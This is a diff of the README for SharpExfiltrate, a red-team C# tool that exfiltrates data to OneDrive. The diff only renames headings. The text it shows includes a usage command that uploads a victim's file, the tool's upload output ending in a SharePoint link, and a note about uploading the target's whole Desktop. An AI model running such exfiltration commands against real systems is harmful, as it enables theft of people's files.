@@ -3,7 +3,7 @@ SharpExfiltrate is a tiny but modular C# framework to exfiltrate loot over secur
 Exfiltrated data will be compressed and encrypted before being uploaded.
 While exfiltrating a large amount of data will require the output stream to be cached on disk, smaller exfiltration operations can be done all in memory with the "memoryonly" option. 
 
-# Example Run
+# Usage
 
 ```
 .\SharpExfiltrate.exe OneDrive --username <redacted> --password "<redacted>" --filepath "C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe"
@@ -30,9 +30,6 @@ While exfiltrating a large amount of data will require the output stream to be c
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (99%)
 [+] Upload completed, file located: https://<redacted>-my.sharepoint.com/personal/<redacted>/Documents/DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip
 ```
-
-
-# Usage Examples
 
 Upload The entire targets Desktop folder, including files and subfolders, using the OneDrive module.
 ```
